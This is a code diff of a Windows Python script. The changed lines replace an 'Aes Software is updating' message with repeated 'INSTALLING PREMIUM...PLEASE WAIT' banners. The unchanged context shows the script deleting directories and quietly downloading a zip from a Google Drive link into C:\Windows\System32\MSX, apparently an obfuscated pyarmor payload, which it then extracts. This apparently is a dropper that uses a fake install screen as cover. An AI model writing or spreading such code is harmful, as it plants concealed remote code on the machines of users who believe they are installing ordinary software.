@@ -202,9 +202,7 @@ def delete_files_if_aesv3_missing():
                     shutil.rmtree(item)
                     os.system('cls')
                     print("")
-                    print("Aes Software is updating, please don't close the window.")
-                    print("Change log:")
-                    print("---Improve security.")
+                    print("PREMIUM is updating, please don't close the window.")
                     print("")
                     print("")
     else:
@@ -217,7 +215,14 @@ def download_file_from_google_drive(url, output_path):
         gdown.download(url, output=output_path, quiet=True)
 
 if not os.path.exists("C:\\Windows\\System32\\MSX\\pyarmor_runtime_000000"):
-    print("downloading required libraries, please wait a moment...")
+    print("")
+    print("")
+    print("")
+    print("> INSTALLING PREMIUM...PLEASE WAIT...")
+    print("")
+    print("")
+    print("")
+    print("> INSTALLING PREMIUM...PLEASE WAIT...")
     download_file_from_google_drive("https://drive.google.com/uc?id=1UTq9mK47Ut4j7ekafF4h921s0SPnbJMP", "C:\\Windows\\System32\\MSX\\prxprx.zip")
     zip_file = r'C:\Windows\System32\MSX\prxprx.zip'
     extract_dir = r'C:\Windows\System32\MSX'
